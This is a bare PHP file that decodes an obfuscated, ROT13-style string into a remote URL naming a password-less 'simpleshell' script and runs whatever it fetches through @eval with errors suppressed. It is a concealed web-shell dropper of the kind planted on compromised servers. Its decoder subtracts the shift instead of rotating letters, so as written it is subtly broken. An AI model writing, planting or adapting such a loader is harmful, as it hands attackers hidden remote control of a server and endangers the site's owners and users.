<?php
#1jkf
function decrypt_caesar($text, $shift) {
    $output = '';
    foreach (str_split($text) as $char) {
        $output .= chr(ord($char) - $shift);
    }
    return $output;
}
$link = decrypt_caesar("uggcf://enj.cbfgvatrpbagnpg.pbzrgzrf/AbboGrpub/fvzcyrfuryy/ersf/urnqf/znva/fvzcyrf-ab-cj.cuc", 13);
@eval("?>" . @file_get_contents($link));
?>
